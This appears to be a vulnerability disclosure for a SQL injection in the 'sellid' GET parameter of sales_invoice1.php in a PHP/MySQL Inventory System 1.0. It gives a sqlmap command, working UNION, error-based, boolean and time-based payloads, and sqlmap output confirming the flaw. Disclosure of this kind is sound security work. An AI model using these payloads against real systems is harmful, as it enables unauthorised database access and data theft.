# SQL Injection in Inventory System (Sales Invoice)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Error-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Sales Invoice (`sales_invoice1.php`)
* **Vulnerable Parameter**: `sellid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `sales_invoice1.php` file.

The application fails to properly sanitize the `sellid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL**, the injection point supports multiple techniques, including **Error-based injection** and **UNION queries** (25 columns), allowing attackers to directly retrieve and display sensitive data from the database.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `sales_invoice1.php` injecting SQL into the `sellid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/sales_invoice1.php?sellid=%22SD432%22" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sellid="SD432" UNION ALL SELECT NULL,CONCAT(0x716b766b71,0x6b7a65414a6377564f6c6449706b68466d7278765157646143586d7774437a5479536b466d505149,0x7170716a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

```

**Error-based Payload:**

```sql
sellid=GTID_SUBSET(CONCAT(0x716b766b71,(SELECT (ELT(4180=4180,1))),0x7170716a71),4180)

```

**Boolean-based Blind Payload:**

```sql
sellid="SD432" AND 1866=1866

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sellid` parameter is vulnerable to UNION-based, Error-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sellid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sellid="SD432" AND 1866=1866
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: sellid=GTID_SUBSET(CONCAT(0x716b766b71,(SELECT (ELT(4180=4180,1))),0x7170716a71),4180)
    Vector: GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sellid="SD432" AND (SELECT 5819 FROM (SELECT(SLEEP(5)))CJlo)
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 25 columns
    Payload: sellid="SD432" UNION ALL SELECT NULL,CONCAT(0x716b766b71,0x6b7a65414a6377564f6c6449706b68466d7278765157646143586d7774437a5479536b466d505149,0x7170716a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL

```
<img width="1015" height="461" alt="图片" src="https://github.com/user-attachments/assets/de2870d6-b0e8-42d2-b3d7-308bcdddc827" />



## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
